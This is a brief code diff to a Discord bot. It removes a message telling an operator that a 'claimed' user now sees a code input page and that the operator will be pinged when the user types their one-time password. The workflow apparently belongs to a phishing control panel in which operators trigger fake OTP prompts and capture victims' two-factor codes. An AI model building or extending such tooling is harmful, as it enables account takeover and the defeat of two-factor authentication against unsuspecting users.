@@ -279,10 +279,6 @@ class OTPButton(discord.ui.Button):
             await interaction.response.edit_message(
                 view=ClaimedView(u, cfg, asked=True)
             )
-            await interaction.followup.send(
-                f"✅ Asked for OTP. The user `{u['nickname']}` now sees the code input page. You'll be pinged here as soon as they type it.",
-                ephemeral=False,
-            )
         except Exception:
             pass
         await log_action(f"🔑 <@{interaction.user.id}> pressed **OTP** for `{u['nickname']}`")
